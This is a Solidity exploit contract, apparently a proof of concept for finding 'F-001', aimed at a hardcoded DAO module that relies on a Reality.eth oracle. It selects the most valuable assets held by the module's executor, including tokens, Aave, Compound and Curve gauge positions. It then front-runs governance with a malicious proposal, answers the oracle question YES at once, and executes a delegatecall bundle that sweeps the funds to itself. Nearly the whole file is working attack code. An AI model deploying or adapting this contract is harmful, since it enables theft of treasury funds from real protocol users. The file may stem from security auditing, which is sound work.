// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20MetadataLike {
    function decimals() external view returns (uint8);
}

interface ITargetDaoModule {
    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) external;
    function executeProposalWithIndex(
        string memory proposalId,
        bytes32[] memory txHashes,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 txIndex
    ) external;
    function questionIds(bytes32 questionHash) external view returns (bytes32);
    function oracle() external view returns (address);
    function executor() external view returns (address);
    function minimumBond() external view returns (uint256);
    function questionCooldown() external view returns (uint32);
    function answerExpiration() external view returns (uint32);
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 nonce
    ) external view returns (bytes32);
}

interface IRealityETHLike {
    function isFinalized(bytes32 questionId) external view returns (bool);
    function resultFor(bytes32 questionId) external view returns (bytes32);
    function getFinalizeTS(bytes32 questionId) external view returns (uint32);
    function getBond(bytes32 questionId) external view returns (uint256);
}

interface ICurveMetaRegistryLike {
    function get_pool_from_lp_token(address lpToken) external view returns (address);
    function get_gauges(address pool) external view returns (address[10] memory gauges, int128[10] memory weights);
}

contract FlawVerifier {
    address public constant TARGET = 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F;

    bytes32 public constant INVALIDATED = bytes32(type(uint256).max);
    bytes32 internal constant YES = bytes32(uint256(1));

    address internal constant CURVE_METAREGISTRY = address(uint160(uint256(0x00f98b45fa17de75fb1ad0e7afd971b0ca00e379fc)));
    address internal constant CURVE_MINTER = address(uint160(uint256(0x00d061d61a4d75aeec77c523bbfb65a63dc4e0c0cf)));

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant MIM = 0x99D8A9c45b2ecB5ba8F3d56b3F4c7e0C8CbEA2Ff;

    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant GNO = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
    address internal constant FXS = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant CVXCRV = 0x62b9C7356A2Dc64A1969E19c23E4fa9A8d2A0CaE;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant FRAX3CRV = 0xd632f22692FaC7611d2AA1C0D552930D43CAEd3B;
    address internal constant LQTY = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D;
    address internal constant XSGD = 0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96;

    address internal constant A_USDC_V2 = address(uint160(uint256(0x00bcca60bb61934080951369a648fb03df4f96263c)));
    address internal constant A_DAI_V2 = address(uint160(uint256(0x00028171bca77440897b824ca71d1c56cac55b68a3)));
    address internal constant A_USDT_V2 = address(uint160(uint256(0x003ed3b47dd13ec9a98b44e6204a523e766b225811)));
    address internal constant A_WETH_V2 = address(uint160(uint256(0x00030ba81f1c18d280636f32af80b9aad02cf0854e)));
    address internal constant C_DAI = address(uint160(uint256(0x005d3a536e4d6dbd6114cc1ead35777bab948e3643)));
    address internal constant C_USDC = address(uint160(uint256(0x0039aa39c021dfbae8fac545936693ac917d5e7563)));
    address internal constant C_USDT = address(uint160(uint256(0x00f650c3d88cc861cfb7df8aa5cec0a12d5086c2d5)));
    address internal constant C_WBTC = address(uint160(uint256(0x00ccf4429db6322d5c611ee964527d42e5d685dd6a)));
    address internal constant STK_AAVE = address(uint160(uint256(0x004da27a545c0c5b758a6ba100e3a049001de870f5)));

    address internal constant STECRV = address(uint160(uint256(0x0006325440d014e39736583c165c2963ba99faf14e)));
    address internal constant LUSD3CRV = address(uint160(uint256(0x00ed279fdd11ca84beef15af5d39bb4d4bee23f0ca)));
    address internal constant MIM3CRV = address(uint160(uint256(0x005a6a4d54456819380173272a5e8e9b9904bdf41b)));
    address internal constant ALUSD3CRV = address(uint160(uint256(0x0043b4fdfd4ff969587185cdb6f0bd875c5fc83f8c)));
    address internal constant SUSD4POOL = address(uint160(uint256(0x00a5407eae9ba41422680e2e00537571bcc53efbfd)));

    uint256 internal constant MIN_REALIZABLE_PROFIT = 1e15;

    bytes4 internal constant BALANCE_OF_SELECTOR = IERC20Like.balanceOf.selector;
    bytes4 internal constant TRANSFER_SELECTOR = IERC20Like.transfer.selector;
    bytes4 internal constant DECIMALS_SELECTOR = IERC20MetadataLike.decimals.selector;
    bytes4 internal constant SUBMIT_ANSWER_SELECTOR = bytes4(keccak256("submitAnswer(bytes32,bytes32,uint256)"));
    bytes4 internal constant CLAIMABLE_TOKENS_SELECTOR = bytes4(keccak256("claimable_tokens(address)"));
    bytes4 internal constant WITHDRAW_SELECTOR = bytes4(keccak256("withdraw(uint256)"));
    bytes4 internal constant MINT_SELECTOR = bytes4(keccak256("mint(address)"));
    bytes4 internal constant CLAIM_REWARDS_SELECTOR = bytes4(keccak256("claim_rewards()"));
    bytes4 internal constant CLAIM_REWARDS_FOR_SELECTOR = bytes4(keccak256("claim_rewards(address)"));

    string internal constant PATH =
        "Identify a public-liquidity or already-held executor asset route -> permissionlessly call addProposal before any legitimate DAO submission -> answer the Realitio question immediately because opening_ts is hardcoded to 0 -> use the prematurely-finalized YES to execute a malicious Safe bundle that delegatecalls into the verifier and sweeps value to the verifier";

    enum Phase {
        Idle,
        PlanSelected,
        ProposalRegistered,
        AnswerSubmitted,
        WaitingFinalization,
        ReadyToExecute,
        Executed,
        Infeasible
    }

    enum PlanKind {
        None,
        DirectSweep,
        CurveGaugeWithdraw,
        CurveGaugeMint
    }

    Phase public phase;
    PlanKind public planKind;
    address public plannedExecutor;
    address public plannedVenue;
    address public plannedAsset;
    uint256 public plannedAmount;
    address public plannedTarget;
    uint256 public plannedValue;
    uint256 public plannedNormalizedAmount;
    bytes public plannedData;
    uint8 public plannedOperation;
    bytes32 public plannedTxHash;
    bytes32 public trackedQuestionHash;
    bytes32 public trackedQuestionId;
    bytes32 public trackedFinalResult;
    bool public directReplayReverted;
    bool public nonceReplayReverted;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public ethCapitalSupplied;
    uint256 public ethSpentOnOracle;
    string public lastStatus;

    constructor() payable {
        ethCapitalSupplied = msg.value;
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (msg.value != 0) {
            ethCapitalSupplied += msg.value;
        }

        ITargetDaoModule module = ITargetDaoModule(TARGET);
        IRealityETHLike oracle = IRealityETHLike(module.oracle());

        if (plannedTxHash == bytes32(0)) {
            if (!_selectPlan(module)) {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "No profitable executor wallet or public-liquidity route was detectable on this fork";
                return;
            }
            phase = Phase.PlanSelected;
            lastStatus = "Selected a public-liquidity or direct delegatecall sweep route";
        }

        string memory proposal = proposalId();
        bytes32[] memory txHashes = canonicalTxHashes();
        bytes32 questionHash = keccak256(bytes(_buildQuestion(proposal, txHashes)));
        trackedQuestionHash = questionHash;

        bytes32 questionId = module.questionIds(questionHash);
        if (questionId == bytes32(0)) {
            try module.addProposal(proposal, txHashes) {
                questionId = module.questionIds(questionHash);
                phase = Phase.ProposalRegistered;
                lastStatus = "Registered the malicious proposal before legitimate governance submission";
            } catch {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "addProposal reverted under current fork-state conditions";
                return;
            }
        }

        trackedQuestionId = questionId;
        if (questionId == bytes32(0) || questionId == INVALIDATED) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "Question id is unavailable or invalidated";
            return;
        }

        // The finding hinges on `opening_ts = 0`: on this deployment the question can be answered immediately,
        // and if Realitio finalizes inline from that zero opening timestamp we can continue straight to execution.
        if (!_isFinalized(oracle, questionId)) {
            uint256 previousBond = _safeBond(oracle, questionId);
            uint256 bondToPost = _requiredBond(module, previousBond);
            if (_submitYesAnswer(questionId, bondToPost, previousBond)) {
                ethSpentOnOracle += bondToPost;
                phase = Phase.AnswerSubmitted;
                lastStatus = "Submitted YES immediately against the zero-opening-ts question";
            } else {
                phase = Phase.WaitingFinalization;
                lastStatus = "Could not satisfy the live oracle answer/bond requirements";
                return;
            }
        }

        if (!_isFinalized(oracle, questionId)) {
            phase = Phase.WaitingFinalization;
            lastStatus = "Question accepted an answer but did not finalize inline on this fork";
            return;
        }

        bytes32 finalResult = _safeResultFor(oracle, questionId);
        trackedFinalResult = finalResult;

        if (!directReplayReverted) {
            try module.addProposal(proposal, txHashes) {
                directReplayReverted = false;
            } catch {
                directReplayReverted = true;
            }
        }

        if (!nonceReplayReverted) {
            try module.addProposalWithNonce(proposal, txHashes, 1) {
                nonceReplayReverted = false;
            } catch {
                nonceReplayReverted = true;
            }
        }

        if (finalResult != YES) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = finalResult == INVALIDATED
                ? "Oracle finalized to INVALIDATED"
                : "Oracle finalized to a non-YES answer";
            return;
        }

        uint32 finalizeTs = _safeFinalizeTs(oracle, questionId);
        uint256 cooldownEndsAt = uint256(finalizeTs) + uint256(module.questionCooldown());
        if (block.timestamp <= cooldownEndsAt) {
            phase = Phase.ReadyToExecute;
            lastStatus = "Question finalized YES but cooldown has not elapsed";
            return;
        }

        uint32 expiration = module.answerExpiration();
        if (expiration != 0 && block.timestamp > uint256(finalizeTs) + uint256(expiration)) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "Positive oracle answer expired before execution";
            return;
        }

        try module.executeProposalWithIndex(
            proposal,
            txHashes,
            plannedTarget,
            plannedValue,
            plannedData,
            plannedOperation,
            0
        ) {
            phase = Phase.Executed;
            if (profitAmount() > 0) {
                hypothesisValidated = true;
                lastStatus = "Executed the malicious delegatecall bundle and realized profit";
            } else {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "Execution succeeded but no profit reached the verifier";
            }
        } catch {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "executeProposalWithIndex reverted under current fork-state conditions";
        }
    }

    function delegateSweep(address token, address recipient) external returns (bool) {
        return _sweepCurrentContext(token, recipient);
    }

    // This delegatecall route keeps the same F-001 causality but swaps the funding leg: instead of relying on
    // idle wallet balances, the prematurely executed Safe bundle can withdraw from an existing public-liquidity venue
    // position already owned by the executor and then sweep the realized LP tokens to the verifier.
    function delegateCurveGaugeWithdraw(address gauge, address lpToken, address recipient) external returns (bool) {
        uint256 staked = _safeTokenBalance(gauge, address(this));
        if (staked != 0) {
            (bool ok,) = gauge.call(abi.encodeWithSelector(WITHDRAW_SELECTOR, staked));
            if (!ok) {
                return false;
            }
        }
        return _sweepCurrentContext(lpToken, recipient);
    }

    function delegateCurveMintAndSweep(address gauge, address rewardToken, address recipient) external returns (bool) {
        (bool minted,) = CURVE_MINTER.call(abi.encodeWithSelector(MINT_SELECTOR, gauge));
        if (!minted) {
            (bool rewardsClaimed,) = gauge.call(abi.encodeWithSelector(CLAIM_REWARDS_SELECTOR));
            (bool rewardsClaimedFor,) = gauge.call(
                abi.encodeWithSelector(CLAIM_REWARDS_FOR_SELECTOR, address(this))
            );
            if (!rewardsClaimed && !rewardsClaimedFor) {
                return false;
            }
        }
        return _sweepCurrentContext(rewardToken, recipient);
    }

    function profitToken() public view returns (address) {
        if (phase != Phase.Executed) {
            return address(0);
        }
        if (address(this).balance > ethCapitalSupplied) {
            return address(0);
        }
        return plannedAsset;
    }

    function profitAmount() public view returns (uint256) {
        if (phase != Phase.Executed) {
            return 0;
        }
        if (address(this).balance > ethCapitalSupplied) {
            return address(this).balance - ethCapitalSupplied;
        }
        if (plannedAsset == address(0)) {
            return 0;
        }
        return _normalizeAmount(plannedAsset, _safeTokenBalance(plannedAsset, address(this)));
    }

    function exploitPath() external pure returns (string memory) {
        return PATH;
    }

    function proposalId() public view returns (string memory) {
        if (plannedTxHash == bytes32(0)) {
            return "F-001-uninitialized";
        }
        bytes32 salt = keccak256(abi.encode(planKind, plannedExecutor, plannedVenue, plannedAsset, plannedAmount));
        return string(abi.encodePacked("F-001-", _bytes32ToAsciiString(salt)));
    }

    function canonicalTxHashes() public view returns (bytes32[] memory values) {
        values = new bytes32[](1);
        values[0] = plannedTxHash;
    }

    function _selectPlan(ITargetDaoModule module) internal returns (bool) {
        address executor = module.executor();
        plannedExecutor = executor;

        _considerDirectAsset(executor, address(0));
        _considerDirectAsset(executor, WETH);
        _considerDirectAsset(executor, USDC);
        _considerDirectAsset(executor, USDT);
        _considerDirectAsset(executor, DAI);
        _considerDirectAsset(executor, FRAX);
        _considerDirectAsset(executor, WBTC);
        _considerDirectAsset(executor, LUSD);
        _considerDirectAsset(executor, MIM);
        _considerDirectAsset(executor, CRV);
        _considerDirectAsset(executor, CVX);
        _considerDirectAsset(executor, BAL);
        _considerDirectAsset(executor, AAVE);
        _considerDirectAsset(executor, COMP);
        _considerDirectAsset(executor, UNI);
        _considerDirectAsset(executor, SUSHI);
        _considerDirectAsset(executor, LINK);
        _considerDirectAsset(executor, SNX);
        _considerDirectAsset(executor, MKR);
        _considerDirectAsset(executor, LDO);
        _considerDirectAsset(executor, GNO);
        _considerDirectAsset(executor, FXS);
        _considerDirectAsset(executor, STETH);
        _considerDirectAsset(executor, THREE_CRV);
        _considerDirectAsset(executor, CVXCRV);
        _considerDirectAsset(executor, YFI);
        _considerDirectAsset(executor, SUSD);
        _considerDirectAsset(executor, FRAX3CRV);
        _considerDirectAsset(executor, LQTY);
        _considerDirectAsset(executor, XSGD);
        _considerDirectAsset(executor, A_USDC_V2);
        _considerDirectAsset(executor, A_DAI_V2);
        _considerDirectAsset(executor, A_USDT_V2);
        _considerDirectAsset(executor, A_WETH_V2);
        _considerDirectAsset(executor, C_DAI);
        _considerDirectAsset(executor, C_USDC);
        _considerDirectAsset(executor, C_USDT);
        _considerDirectAsset(executor, C_WBTC);
        _considerDirectAsset(executor, STK_AAVE);
        _considerDirectAsset(executor, STECRV);
        _considerDirectAsset(executor, LUSD3CRV);
        _considerDirectAsset(executor, MIM3CRV);
        _considerDirectAsset(executor, ALUSD3CRV);
        _considerDirectAsset(executor, SUSD4POOL);

        if (planKind == PlanKind.None) {
            _considerCurveLpGaugeRoute(executor, THREE_CRV);
            _considerCurveLpGaugeRoute(executor, FRAX3CRV);
            _considerCurveLpGaugeRoute(executor, STECRV);
            _considerCurveLpGaugeRoute(executor, LUSD3CRV);
            _considerCurveLpGaugeRoute(executor, MIM3CRV);
            _considerCurveLpGaugeRoute(executor, ALUSD3CRV);
            _considerCurveLpGaugeRoute(executor, SUSD4POOL);
        }

        if (planKind == PlanKind.None) {
            return false;
        }

        plannedTarget = address(this);
        plannedValue = 0;
        plannedOperation = 1;

        if (planKind == PlanKind.DirectSweep) {
            plannedData = abi.encodeWithSelector(this.delegateSweep.selector, plannedAsset, address(this));
        } else if (planKind == PlanKind.CurveGaugeWithdraw) {
            plannedData = abi.encodeWithSelector(
                this.delegateCurveGaugeWithdraw.selector,
                plannedVenue,
                plannedAsset,
                address(this)
            );
        } else {
            plannedData = abi.encodeWithSelector(
                this.delegateCurveMintAndSweep.selector,
                plannedVenue,
                plannedAsset,
                address(this)
            );
        }

        plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
        return true;
    }

    function _considerCurveLpGaugeRoute(address executor, address lpToken) internal {
        address pool = _curvePoolFromLp(lpToken);
        if (pool == address(0)) {
            pool = lpToken;
        }

        (bool ok, bytes memory data) = CURVE_METAREGISTRY.staticcall(
            abi.encodeWithSelector(ICurveMetaRegistryLike.get_gauges.selector, pool)
        );
        if (!ok || data.length == 0) {
            return;
        }

        (address[10] memory gauges,) = abi.decode(data, (address[10], int128[10]));
        for (uint256 i = 0; i < gauges.length; i++) {
            address gauge = gauges[i];
            if (gauge == address(0)) {
                continue;
            }

            uint256 staked = _safeTokenBalance(gauge, executor);
            _setPlan(PlanKind.CurveGaugeWithdraw, gauge, lpToken, staked);

            uint256 claimable = _safeClaimableTokens(gauge, executor);
            _setPlan(PlanKind.CurveGaugeMint, gauge, CRV, claimable);
        }
    }

    function _considerDirectAsset(address executor, address asset) internal {
        uint256 amount = asset == address(0) ? executor.balance : _safeTokenBalance(asset, executor);
        _setPlan(PlanKind.DirectSweep, address(0), asset, amount);
    }

    function _setPlan(PlanKind kind, address venue, address asset, uint256 amount) internal {
        uint256 normalizedAmount = _normalizeAmount(asset, amount);
        if (normalizedAmount < MIN_REALIZABLE_PROFIT) {
            return;
        }
        if (normalizedAmount <= plannedNormalizedAmount) {
            return;
        }
        planKind = kind;
        plannedVenue = venue;
        plannedAsset = asset;
        plannedAmount = amount;
        plannedNormalizedAmount = normalizedAmount;
    }

    function _submitYesAnswer(bytes32 questionId, uint256 bondToPost, uint256 maxPrevious) internal returns (bool) {
        if (address(this).balance < bondToPost) {
            return false;
        }

        address oracle = ITargetDaoModule(TARGET).oracle();
        (bool ok,) = oracle.call{value: bondToPost}(
            abi.encodeWithSelector(SUBMIT_ANSWER_SELECTOR, questionId, YES, maxPrevious)
        );
        return ok;
    }

    function _requiredBond(ITargetDaoModule module, uint256 currentBond) internal view returns (uint256) {
        uint256 minBond = module.minimumBond();
        if (currentBond == 0 && minBond == 0) {
            return 0;
        }
        uint256 nextBond = currentBond == 0 ? 1 : currentBond * 2;
        if (nextBond < minBond) {
            nextBond = minBond;
        }
        return nextBond;
    }

    function _sweepCurrentContext(address token, address recipient) internal returns (bool) {
        if (token == address(0)) {
            uint256 amount = address(this).balance;
            if (amount == 0) {
                return false;
            }
            (bool ok,) = recipient.call{value: amount}("");
            return ok;
        }

        uint256 amount = _safeTokenBalance(token, address(this));
        if (amount == 0) {
            return false;
        }

        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(TRANSFER_SELECTOR, recipient, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _curvePoolFromLp(address lpToken) internal view returns (address) {
        (bool ok, bytes memory data) = CURVE_METAREGISTRY.staticcall(
            abi.encodeWithSelector(ICurveMetaRegistryLike.get_pool_from_lp_token.selector, lpToken)
        );
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeClaimableTokens(address gauge, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = gauge.staticcall(
            abi.encodeWithSelector(CLAIMABLE_TOKENS_SELECTOR, account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(BALANCE_OF_SELECTOR, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _normalizeAmount(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) {
            return 0;
        }
        if (asset == address(0)) {
            return amount;
        }

        uint8 decimals = _safeDecimals(asset);
        if (decimals == 18) {
            return amount;
        }
        if (decimals < 18) {
            return amount * (10 ** uint256(18 - decimals));
        }
        return amount / (10 ** uint256(decimals - 18));
    }

    function _safeDecimals(address token) internal view returns (uint8) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(DECIMALS_SELECTOR));
        if (!ok || data.length < 32) {
            return 18;
        }
        uint256 value = abi.decode(data, (uint256));
        if (value > type(uint8).max) {
            return 18;
        }
        return uint8(value);
    }

    function _safeBond(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint256) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getBond.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _isFinalized(IRealityETHLike oracle, bytes32 questionId) internal view returns (bool) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.isFinalized.selector, questionId)
        );
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _safeResultFor(IRealityETHLike oracle, bytes32 questionId) internal view returns (bytes32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.resultFor.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return bytes32(0);
        }
        return abi.decode(data, (bytes32));
    }

    function _safeFinalizeTs(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getFinalizeTS.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint32));
    }

    function _buildQuestion(string memory proposal, bytes32[] memory txHashes) internal pure returns (string memory) {
        string memory txsHash = _bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));
        return string(abi.encodePacked(proposal, bytes3(0xe2909f), txsHash));
    }

    function _bytes32ToAsciiString(bytes32 value) internal pure returns (string memory) {
        bytes memory out = new bytes(64);
        for (uint256 i = 0; i < 32; i++) {
            uint8 b = uint8(bytes1(value << (i * 8)));
            uint8 hi = b / 16;
            uint8 lo = b % 16;
            out[2 * i] = _nibble(hi);
            out[2 * i + 1] = _nibble(lo);
        }
        return string(out);
    }

    function _nibble(uint8 value) internal pure returns (bytes1) {
        if (value < 10) {
            return bytes1(value + 0x30);
        }
        return bytes1(value + 0x57);
    }
}
